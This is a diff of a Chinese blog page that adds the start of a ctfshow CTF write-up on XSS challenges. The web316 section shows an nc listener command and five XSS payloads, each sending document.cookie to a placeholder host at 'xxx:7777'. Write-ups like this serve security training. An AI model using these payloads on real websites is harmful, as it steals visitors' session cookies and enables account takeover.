@@ -230,12 +230,12 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/ctfshow/" style="color: #ffa2c4">ctfshow</a>
+                <a href="/blog/tags/ctfshow/" style="color: #00bcd4">ctfshow</a>
             </span>
             
             <span class="tag">
                 
-                <a href="/blog/tags/xss/" style="color: #ffa2c4">xss</a>
+                <a href="/blog/tags/xss/" style="color: #00a596">xss</a>
             </span>
             
         </span>
@@ -249,7 +249,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">32字</span>
+        <span class="post-count">164字</span>
       </span>
     </span>
 
@@ -275,10 +275,23 @@
     <div class="content" v-pre>
         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>ctfshow web316-333</p>
 <p><a target="_blank" rel="noopener" href="https://boogipop.com/2022/10/03/CTFSHOW-XSS">参考Boogipop的博客</a></p>
-<p>嘶，好像需要公网http才能做这个，先咕了（</p>
+<p>本人没有vps，于是基于HTCP映射内网穿透来做这几题，配置可以参考<a target="_blank" rel="noopener" href="https://blog.51cto.com/u_15076215/4531399">https://blog.51cto.com/u_15076215/4531399</a></p>
 <span id="more"></span>
 
-<h1 id="语法基础"><a href="#语法基础" class="headerlink" title="语法基础"></a>语法基础</h1><h1 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h1>
+<h1 id="语法基础"><a href="#语法基础" class="headerlink" title="语法基础"></a>语法基础</h1><h1 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h1><p>先在本地虚拟机上开启监听</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">777</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>然后在题目页面输入xss代码</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'http://xxx:7777/'</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript">window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'http://xxx:7777/'</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript">window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'http://xxx:7777/'</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token special-attr"><span class="token attr-name">onfocus</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript">window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'http://xxx:7777/'</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span> <span class="token attr-name">autofocus</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>input</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript">window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'http://xxx:7777/'</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/08/22/ctfshow-XSS/image-20230909203906426.png" alt="image-20230909203906426"></p>
+<p>这里要nc多次才能得到flag，因为我们自己本身也点了，相当于X自己</p>
+<p><img src="/blog/2023/08/22/ctfshow-XSS/image-20230909203937969.png" alt="image-20230909203937969"></p>
+
     </div>
     
     
